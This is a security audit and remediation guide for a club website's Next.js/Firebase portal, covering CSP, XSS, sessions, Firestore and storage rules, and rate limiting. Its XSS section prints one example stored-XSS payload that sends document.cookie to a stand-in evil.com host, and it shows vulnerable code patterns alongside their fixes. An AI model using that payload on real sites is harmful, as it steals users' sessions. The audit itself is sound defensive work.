# 🔒 Rotaract NYC — Security Audit & Remediation Guide

> **Audit Date:** April 6, 2026
> **Scope:** Authentication, authorization, CSP, XSS, input validation, Firestore rules, storage rules, rate limiting, session management
> **Related:** `docs/AUDIT.md` (full audit) · `docs/V1_ROADMAP.md` (remediation roadmap)

---

## Table of Contents

- [Threat Model](#threat-model)
- [1. Content Security Policy (CSP)](#1-content-security-policy-csp)
- [2. Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
- [3. Authentication & Session Management](#3-authentication--session-management)
- [4. Authorization & Access Control](#4-authorization--access-control)
- [5. Input Validation & Sanitization](#5-input-validation--sanitization)
- [6. Rate Limiting](#6-rate-limiting)
- [7. Firestore Security Rules](#7-firestore-security-rules)
- [8. Storage Security Rules](#8-storage-security-rules)
- [9. API Route Security](#9-api-route-security)
- [10. Infrastructure Security](#10-infrastructure-security)
- [Remediation Priority Matrix](#remediation-priority-matrix)

---

## Threat Model

| Threat Actor | Motivation | Attack Surface |
|-------------|-----------|----------------|
| **Anonymous visitor** | Spam, abuse, scraping | Contact form, donate, membership interest, public API |
| **Authenticated member** | Data exfiltration, privilege escalation | Portal API routes, Firestore client queries, file uploads |
| **Compromised admin/board** | Stored XSS, data manipulation | Article creation, event management, member management |
| **External attacker** | Account takeover, session hijacking | Auth flow, session cookies, open redirects |

---

## 1. Content Security Policy (CSP)

### Current State

**File:** `next.config.js`

```
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://js.stripe.com https://apis.google.com ...
```

### Issues

| ID | Severity | Issue |
|----|----------|-------|
| CSP-1 | 🔴 Critical | **`'unsafe-eval'` present** — allows `eval()`, `new Function()`, `setTimeout('string')`. This makes CSP essentially ineffective against XSS because injected scripts can execute arbitrary code. |
| CSP-2 | 🔴 Critical | **`'unsafe-inline'` for scripts** — allows inline `<script>` tags and event handlers. Combined with `'unsafe-eval'`, CSP provides almost no XSS protection. |
| CSP-3 | 🟢 Info | **`'unsafe-inline'` for styles** — acceptable trade-off for Tailwind CSS and styled-jsx. Hard to avoid without significant refactoring. |

### Root Cause Analysis

`'unsafe-eval'` is likely required by one of:
- **`react-quill`** — Rich text editor uses `eval` internally
- **`novel`** — Editor dependency
- **Styled-jsx** — May use `eval` for dynamic styles at runtime

### Remediation

**Step 1:** Identify which library requires `'unsafe-eval'`
```bash
# Search for eval usage in node_modules
grep -r "eval(" node_modules/react-quill/dist/ --include="*.js" | head -5
grep -r "new Function" node_modules/novel/dist/ --include="*.js" | head -5
```

**Step 2:** Remove `'unsafe-eval'`
- If `react-quill`: Replace with `@tiptap/react` or `lexical` (no eval required)
- If `novel`: Check if a newer version fixes this, or use in a sandboxed iframe
- If `styled-jsx`: Should work without `unsafe-eval` in production builds

**Step 3:** Replace `'unsafe-inline'` for scripts with nonce-based CSP
- Next.js 14 supports nonce via `headers()` in middleware
- The dark-mode script in `layout.tsx` will need a nonce attribute

**Step 4:** Test with [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

### Target CSP

```
script-src 'self' 'nonce-{random}' https://js.stripe.com https://apis.google.com https://www.gstatic.com https://www.googletagmanager.com https://va.vercel-scripts.com;
```

---

## 2. Cross-Site Scripting (XSS)

### Stored XSS in Article Rendering

**File:** `app/(public)/news/[slug]/page.tsx`

```tsx
// VULNERABLE — no sanitization at render time
<div dangerouslySetInnerHTML={{ __html: article.content }} />
```

**Attack scenario:**
1. Attacker compromises a board member account
2. Creates an article with `<img onerror="fetch('https://evil.com/steal?c='+document.cookie)" src="x">`
3. Every visitor to that article has their session cookie stolen

**Remediation:**
```tsx
import DOMPurify from 'isomorphic-dompurify';

// SAFE — sanitized at render time
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(article.content) }} />
```

**Configuration:** Use a strict DOMPurify config:
```tsx
DOMPurify.sanitize(content, {
  ALLOWED_TAGS: ['h1', 'h2', 'h3', 'h4', 'p', 'a', 'ul', 'ol', 'li', 'strong', 'em', 'img', 'blockquote', 'code', 'pre', 'br', 'hr', 'table', 'thead', 'tbody', 'tr', 'th', 'td'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'target', 'rel'],
  ALLOW_DATA_ATTR: false,
});
```

### Other XSS Vectors

| Location | Risk | Status |
|----------|------|--------|
| Contact form inputs | Low — server-side `sanitizeInput()` escapes HTML | ✅ Mitigated |
| Email templates | Medium — inputs escaped before template, but templates have no defense-in-depth | ⚠️ Needs fix |
| Post content in portal | Medium — if rendered with `dangerouslySetInnerHTML` | ⚠️ Needs audit |

---

## 3. Authentication & Session Management

### Architecture

```
Client (Google OAuth popup)
  → Firebase Auth (client SDK)
    → onAuthStateChanged callback
      → POST /api/portal/auth/session (with ID token)
        → Firebase Admin verifyIdToken()
        → createSessionCookie() (14-day expiry)
        → Set HTTP-only cookie
```

### Issues

| ID | Severity | Issue |
|----|----------|-------|
| AUTH-1 | 🟡 Medium | **Middleware JWT check is advisory** — base64-decodes payload and checks `exp` without verifying signature. A crafted JWT with future `exp` bypasses middleware. API routes verify properly via Firebase Admin, but pages render before API calls. |
| AUTH-2 | 🟡 Medium | **No explicit `SameSite` attribute** on session cookie. Should be `SameSite=Lax` (or `Strict`) to prevent CSRF. |
| AUTH-3 | 🟡 Medium | **Session cookie name is predictable** — `rotaract_portal_session`. Not a vulnerability per se, but `__Host-` prefix would enforce additional security (HTTPS, no domain, path=/). |
| AUTH-4 | 🟡 Medium | **`onAuthStateChanged` callback failure** leaves user in broken state — signed into Firebase Auth but `member` is null in app state. |
| AUTH-5 | 🟢 Low | **Name splitting** `displayName.split(' ')` is fragile for multi-word or non-Western names. |

### Remediation

1. **Cookie attributes:** Ensure session cookie is set with:
   ```
   HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=1209600
   ```

2. **Middleware hardening:** Add `iss` (issuer) and `aud` (audience) checks to middleware JWT inspection. Won't prevent all bypass but raises the bar.

3. **Error recovery:** Wrap `onAuthStateChanged` in try/catch. On failure, sign the user out of Firebase and redirect to login with an error message.

### ADMIN_ALLOWLIST Auto-Promotion

The `ADMIN_ALLOWLIST` environment variable contains a comma-separated list of Google email addresses that are **automatically promoted to `role: 'president'`** with `status: 'active'` on first sign-in. This is implemented in `POST /api/portal/auth/session`.

**Security considerations:**

| Concern | Details |
|---------|--------|
| **Scope** | Grants full president-level access (highest privilege tier) — can delete members, manage all finances, and access all admin features |
| **Storage** | Server-only env var — never exposed to the client or committed to source control |
| **Validation** | Compared against the Firebase-verified email from the ID token — cannot be spoofed |
| **Risk** | If the env var is compromised or misconfigured, unauthorized users could gain full admin access on first login |

**Recommendations:**

1. Keep the allowlist as small as possible — ideally only the current president's email
2. Review and update the list during every board transition
3. Audit Firestore `members` collection periodically for unexpected `role: 'president'` entries
4. Consider adding logging when auto-promotion occurs for audit trail purposes

---

## 4. Authorization & Access Control

### Role Hierarchy

```
member → board → treasurer → president
```

### Current Implementation

| Layer | Mechanism | Status |
|-------|-----------|--------|
| **Middleware** | Cookie existence + JWT structure + `exp` check | ⚠️ Advisory only |
| **API Routes** | Firebase Admin `verifySessionCookie(cookie, true)` + role check via Firestore | ✅ Solid |
| **Firestore Rules** | `isMember()`, `isBoard()`, `isTreasurer()`, `isPresident()` helpers | ✅ Solid with issues |
| **Client-side** | `useAuth()` hook provides `member.role` for UI gating | ✅ UI-only (not security) |

### Issues

| ID | Severity | Issue |
|----|----------|-------|
| AUTHZ-1 | 🟡 Medium | **Members GET returns all members** to any authenticated user, including pending members who shouldn't see the directory. |
| AUTHZ-2 | 🟡 Medium | **Settings writable by treasurer** — site settings (public content) shouldn't be controlled by the treasurer role. Should be `isBoard()`. |
| AUTHZ-3 | 🟢 Low | **Board GET endpoint is unauthenticated** — returns board member data to anonymous requests. Acceptable since it's semi-public, but inconsistent with other portal routes. |

---

## 5. Input Validation & Sanitization

### Current State

**`lib/utils/sanitize.ts`** provides:
- `sanitizeInput(str)` — escapes `<`, `>`, `"`, `'`, `&`
- `isValidEmail(email)` — regex validation
- `validateAndSanitize(fields)` — bulk validation

### Coverage

| Endpoint | Input Validation | Sanitization | Status |
|----------|-----------------|-------------|--------|
| POST /api/contact | ✅ Required fields, email format | ✅ `sanitizeInput` | ✅ Good |
| POST /api/donate | ✅ Amount range, preset whitelist | N/A (no user text stored) | ✅ Good |
| POST /api/membership-interest | ✅ Required fields, email format | ✅ `sanitizeInput` | ✅ Good |
| POST /api/portal/events (RSVP) | ⚠️ No status enum validation | N/A | ⚠️ Needs fix |
| POST /api/portal/service-hours | ⚠️ Hours clamped, but no event validation | ✅ Basic | ⚠️ Partial |
| POST /api/portal/posts | ⚠️ No content length limit | ⚠️ Unknown | ⚠️ Needs audit |
| POST /api/portal/messages | ⚠️ No content length limit | ⚠️ Unknown | ⚠️ Needs audit |
| POST /api/upload | ⚠️ File type check is permissive | N/A | ⚠️ Needs fix |

### Remediation

1. Add enum validation for RSVP status: `['going', 'maybe', 'not']`
2. Add content length limits to posts and messages (e.g., 10,000 characters)
3. Tighten upload file type check to explicit MIME whitelist
4. Add `eventId` existence check for service hours

---

## 6. Rate Limiting

### Current State

**File:** `lib/rateLimit.ts`

The rate limiter uses an in-memory `Map<string, { count, resetTime }>` with a `setInterval` cleanup every 60 seconds.

### Critical Problem

On Vercel's serverless architecture:
- Each function invocation may run on a **different instance**
- The `Map` is **not shared** between instances
- The `setInterval` creates a timer that **never clears** (memory leak in long-lived instances)
- **Result:** Rate limiting is essentially non-functional in production

### Current Limits

| Endpoint | Limit | Window | Effective? |
|----------|-------|--------|-----------|
| Contact | 5 | 60s | ❌ No (serverless) |
| Donate | 10 | 60s | ❌ No (serverless) |
| Membership Interest | 3 | 60s | ❌ No (serverless) |
| Portal mutations | — | — | ❌ None configured |

### Remediation

Replace with **Upstash Redis** via `@upstash/ratelimit`:

```typescript
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL!,
  token: process.env.UPSTASH_REDIS_REST_TOKEN!,
});

export const rateLimit = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(5, '60 s'),
  analytics: true,
});
```

**Cost:** Upstash free tier = 10,000 requests/day (sufficient for a club website).

---

## 7. Firestore Security Rules

### File: `firestore.rules`

### Rule Coverage

| Collection | Read | Create | Update | Delete | Status |
|-----------|------|--------|--------|--------|--------|
| members | ✅ member or owner | ✅ owner, pending | ✅ owner (no role/status) or board | ✅ president only | ✅ Good |
| events | ⚠️ public OR member (no status check) | ✅ board | ✅ board | ✅ board | ⚠️ Needs fix |
| rsvps | ✅ member | ✅ member, own UID prefix | ✅ member, own UID prefix | ✅ owner or board | ✅ Good |
| articles | ✅ published OR member | ✅ board | ✅ board | ✅ board | ✅ Good |
| gallery | ✅ anyone | ✅ board | ✅ board | ✅ board | ✅ Good |
| posts | ✅ member | ✅ member, own authorId | ⚠️ likes update too permissive | ✅ author or board | ⚠️ Needs fix |
| documents | ✅ member | ✅ board | ✅ board | ✅ board | ✅ Good |
| serviceHours | ✅ own or board | ✅ member, own, pending | ✅ own pending or board | ✅ board | ✅ Good |
| duesCycles | ✅ member | ✅ treasurer | ✅ treasurer | ✅ treasurer | ✅ Good |
| memberDues | ✅ own or treasurer | ✅ treasurer | ✅ treasurer | ✅ president | ✅ Good |
| transactions | ✅ treasurer | ✅ treasurer | ✅ treasurer | ✅ treasurer | ✅ Good |
| messages | ✅ to/from self | ✅ member, own fromId | ✅ recipient, read only | ✅ to/from self | ✅ Good |
| settings | ✅ anyone | ⚠️ treasurer (should be board) | ⚠️ treasurer (should be board) | ⚠️ treasurer (should be board) | ⚠️ Needs fix |
| committees | ✅ member | ❌ denied | ❌ denied | ❌ denied | ✅ Good |

### Specific Issues

**Issue 1: Events public read allows drafts**
```
// Current — leaks draft events if isPublic is set during creation
allow read: if resource.data.isPublic == true || isMember();

// Fixed — require published status for public reads
allow read: if (resource.data.isPublic == true && resource.data.status == 'published') || isMember();
```

**Issue 2: Posts likes overwrite**
```
// Current — any member can replace the entire likes array
allow update: if isMember() && request.resource.data.diff(resource.data).affectedKeys().hasOnly(['likes']);

// Fixed — validate likes array only grows by current user's UID
allow update: if isMember()
  && request.resource.data.diff(resource.data).affectedKeys().hasOnly(['likes'])
  && request.resource.data.likes.hasAll(resource.data.likes);
```

**Issue 3: No data validation**
Rules don't validate:
- Field types (e.g., `name` must be a string)
- Required fields (e.g., events must have `title` and `date`)
- String lengths (e.g., max 500 chars for descriptions)
- Numeric ranges (e.g., service hours 0.25–24)

Add validation functions:
```
function isValidMember(data) {
  return data.keys().hasAll(['email', 'displayName', 'role', 'status'])
    && data.email is string
    && data.displayName is string && data.displayName.size() <= 100
    && data.role in ['member', 'board', 'treasurer', 'president']
    && data.status in ['pending', 'active', 'inactive', 'alumni'];
}
```

---

## 8. Storage Security Rules

### File: `storage.rules`

### Issues

| Path | Content Type Check | Size Limit | Issue |
|------|-------------------|------------|-------|
| profile-photos | ✅ `isImage()` | ✅ 10MB | 🟢 10MB generous for photos |
| post-attachments | ❌ None | ✅ 10MB | 🔴 Any file type allowed |
| documents | ❌ None | ❌ None | 🟡 No restrictions on docs |
| event-images | ✅ `isImage()` | ✅ 10MB | ✅ Good |
| gallery | ✅ `isImage()` | ✅ 10MB | ✅ Good |
| article-images | ✅ `isImage()` | ✅ 10MB | ✅ Good |
| site-media | ✅ `isImage()` | ✅ 10MB | ✅ Good |
| receipts | ❌ None | ✅ 10MB | 🟡 Should restrict to image+PDF |

### Remediation

```
// Post attachments — allow images and common documents
match /post-attachments/{userId}/{fileName} {
  allow write: if isOwner(userId) && isValidSize()
    && (isImage() || request.resource.contentType.matches('application/pdf'));
}

// Receipts — images and PDFs only
match /receipts/{fileName} {
  allow write: if isBoard() && isValidSize()
    && (isImage() || request.resource.contentType.matches('application/pdf'));
}

// Profile photos — smaller limit
match /profile-photos/{userId}/{fileName} {
  allow write: if isOwner(userId) && isImage()
    && request.resource.size < 5 * 1024 * 1024; // 5MB
}
```

---

## 9. API Route Security

### Security Checklist

| Check | Public Routes | Portal Routes |
|-------|--------------|--------------|
| Rate limiting | ⚠️ Present but ineffective (in-memory) | ❌ Not present |
| Input validation | ✅ Consistent | ⚠️ Partial |
| Auth verification | N/A | ✅ Firebase Admin |
| Role-based access | N/A | ✅ Consistent |
| Error message sanitization | ⚠️ Stripe errors leak | ⚠️ Some raw errors |
| CSRF protection | ⚠️ Cookie-only, no token | ⚠️ Cookie-only, no token |
| `dynamic = 'force-dynamic'` | ✅ All routes | ✅ All routes |

### Open Redirect Risk

**File:** `app/(public)/donate/page.tsx`

```tsx
// Current — follows any URL from API response
window.location.href = data.url;

// Fixed — validate domain
const url = new URL(data.url);
if (url.hostname !== 'checkout.stripe.com') {
  throw new Error('Invalid redirect URL');
}
window.location.href = data.url;
```

---

## 10. Infrastructure Security

### Security Headers (via `next.config.js`)

| Header | Value | Status |
|--------|-------|--------|
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | ✅ Excellent |
| `X-Frame-Options` | `SAMEORIGIN` | ✅ Good |
| `X-Content-Type-Options` | `nosniff` | ✅ Good |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | ✅ Good |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | ✅ Good |
| `Cross-Origin-Opener-Policy` | `same-origin-allow-popups` | ⚠️ Needed for Google Auth popups |
| `Content-Security-Policy` | See Section 1 | ⚠️ Needs hardening |
| `X-DNS-Prefetch-Control` | `on` | ✅ Good |

### Missing Headers

| Header | Recommendation |
|--------|---------------|
| `Cross-Origin-Resource-Policy` | `same-origin` — prevents other sites from loading your resources |
| `Cross-Origin-Embedder-Policy` | `require-corp` — if cross-origin isolation is needed |

### Environment Variable Security

| Variable | Exposure | Notes |
|----------|----------|-------|
| `NEXT_PUBLIC_FIREBASE_*` | Public (by design) | ✅ Read-only Firebase config |
| `FIREBASE_SERVICE_ACCOUNT` | Server-only | ✅ Never exposed to client |
| `RESEND_API_KEY` | Server-only | ✅ Never exposed to client |
| `STRIPE_SECRET_KEY` | Server-only | ✅ Never exposed to client |
| `STRIPE_WEBHOOK_SECRET` | Server-only | ✅ Never exposed to client |
| `AUTOMATION_API_KEY` | GitHub Secrets | ✅ Never in code |

---

## Remediation Priority Matrix

| Priority | Issue | Impact | Effort | Phase |
|----------|-------|--------|--------|-------|
| **P0** | Remove `unsafe-eval` from CSP | Eliminates eval-based XSS | M | 1 |
| **P0** | Sanitize article HTML with DOMPurify | Eliminates stored XSS | S | 1 |
| **P0** | Replace in-memory rate limiter | Functional rate limiting | M | 1 |
| **P1** | Fix contact API error handling | Correct user feedback | S | 1 |
| **P1** | Validate RSVP status enum | Prevent invalid data | XS | 3 |
| **P1** | Fix Firestore events public read rule | Prevent draft leaks | XS | 3 |
| **P1** | Fix Firestore posts likes rule | Prevent likes manipulation | S | 3 |
| **P1** | Add Stripe webhook idempotency | Prevent duplicate transactions | S | 5 |
| **P2** | Restrict post attachment content types | Prevent malicious uploads | XS | 3 |
| **P2** | Add portal route rate limiting | Prevent authenticated abuse | S | 3 |
| **P2** | Validate redirect URLs | Prevent open redirects | XS | 5 |
| **P2** | Set `SameSite=Lax` on session cookie | CSRF mitigation | XS | 6 |
| **P3** | Add Firestore data validation rules | Data integrity | M | 3 |
| **P3** | Re-enable ESLint during builds | Catch security issues in lint | S | 1 |

---

*This document should be reviewed and updated after each phase of remediation is complete.*
